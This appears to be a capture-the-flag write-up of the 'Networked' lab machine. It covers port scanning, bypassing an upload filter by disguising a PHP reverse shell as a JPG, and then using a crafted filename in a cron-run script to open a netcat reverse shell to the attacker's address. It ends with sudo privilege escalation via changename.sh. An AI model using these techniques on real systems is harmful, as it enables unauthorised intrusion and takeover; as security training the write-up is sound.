## Networked

Difficulty: Easy

### Apache User

```
rustscan -a 10.10.10.146 --ulimit 5000 -- -A -sV -sC -oN nmap.txt
```

![rustscan](https://github.com/b1d0ws/OSCP/assets/58514930/c7efcdf6-463b-459b-a06d-4fc9305da032)

<br>

Enumerating directories, we find some interesting files. Backup has some internal files related to the source code of this php functions.

![goBuster](https://github.com/b1d0ws/OSCP/assets/58514930/0530cdd0-3fe1-4f4b-ae26-27b277e8e2ae)

<br>

In upload.php we can upload files, but uploading a traditional php reverse shell is not possible.

![uploadPHP](https://github.com/b1d0ws/OSCP/assets/58514930/e4c08b7d-3a39-4555-8c05-c59d7f2fd682)

<br>

Reading lib.php extracted from the backup we understand how upload.php and lib.php are blocking php files to be uploaded. We need to bypass the check file type and the extension validation.

![uploadPHPCode](https://github.com/b1d0ws/OSCP/assets/58514930/f68f58fc-93c6-47fb-b0e9-a5bd70f101d1)

![mimeType](https://github.com/b1d0ws/OSCP/assets/58514930/46f2c9ac-9894-473b-80ed-f27a5a15392f)

<br>

To bypass this, we rename php-reverse-shell.php to php-reverse-shell.php.jpg and add magic bytes to its header to trick the mime type validation.

![uploadSuccessfull](https://github.com/b1d0ws/OSCP/assets/58514930/3db8dfbb-5af2-4aa8-92fb-d436379dbdb7)

![reverseShellJPG](https://github.com/b1d0ws/OSCP/assets/58514930/4b613891-fc7f-4e59-aa1c-1e63fb425c15)

To execute the file, we need to find the path of it in photos.php.

![photosPHP](https://github.com/b1d0ws/OSCP/assets/58514930/0235e5c3-e646-45bc-ba3c-e696acf385f8)

![accessingReverse](https://github.com/b1d0ws/OSCP/assets/58514930/d1aec802-073e-43df-8c56-85fb870c163c)

### Guly User

With the apache reverse shell, we need to escalate to guly. Inside it's home directory, we discover a crontab running the command above each 3 minutes.

```
php /home/guly/check_attack.php
```

![checkingCrontab](https://github.com/b1d0ws/OSCP/assets/58514930/a3a46414-eed6-4849-917c-8730ee1b26b2)

<br>

Looking at the php code, we see that it is vulnerable to command injection, since the $value variable can be created by us. We just need to create a file inside /var/www/html/uploads with a malicious name and get the code execution.

![checkAttack](https://github.com/b1d0ws/OSCP/assets/58514930/6df85d0e-cb07-4103-ab7e-8938fb8e3e56)

<br>

For some reason, nc with "-e" doesn't work well here.

```
touch '; nc 10.10.14.5 5555 -c bash'
```

![gulyReverseShell](https://github.com/b1d0ws/OSCP/assets/58514930/fce6b9a0-6cc4-46a7-a1e4-50709db2aec4)

### Root Flag

We have permission to execute /usr/local/sbin/changename.sh as sudo as sudo -l shows us.  

This script file deals with network scripts and management in the system.

![changeNameSh](https://github.com/b1d0ws/OSCP/assets/58514930/fac748f2-1058-485c-8fcf-aa5fd18859e5)

<br>

Searching for vulnerabilities related to this, we find this [article](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f).  

Basically we can execute command after inserting the data related to the variables being exported when executing this script.

![privilegeEscalation](https://github.com/b1d0ws/OSCP/assets/58514930/30df0cd9-a378-47de-afd3-2df4c57187c9)
